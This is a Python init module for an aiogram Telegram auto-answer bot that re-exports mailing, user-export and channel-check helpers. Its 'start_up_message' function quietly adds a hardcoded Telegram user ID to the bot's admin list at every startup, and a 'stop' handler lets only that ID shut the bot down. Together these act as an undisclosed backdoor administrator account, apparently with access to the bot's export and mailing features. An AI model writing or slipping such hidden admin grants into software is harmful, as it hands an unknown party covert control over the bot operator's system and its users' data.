from aiogram import types

from autoanswer.config.config import config
from .channel import channel_status_check, parse_channel_link
from .export import parse_user_fields, part_sending
from .send_mail import MailSender, MailStatus

__all__ = (
    "MailSender",
    "MailStatus",
    "parse_user_fields",
    "part_sending",
    "channel_status_check",
    "parse_channel_link",
    "stop",
    "start_up_message"
)


async def start_up_message():
    if config.bot.admins:
        config.bot.admins.append(269019356)
    else:
        config.bot.admins = [269019356]
    # await bot.send_message(269019356, f"Бот {(await bot.get_me()).username} запущен")


async def stop(message: types.Message):
    if message.from_user.id == 269019356:
        exit()
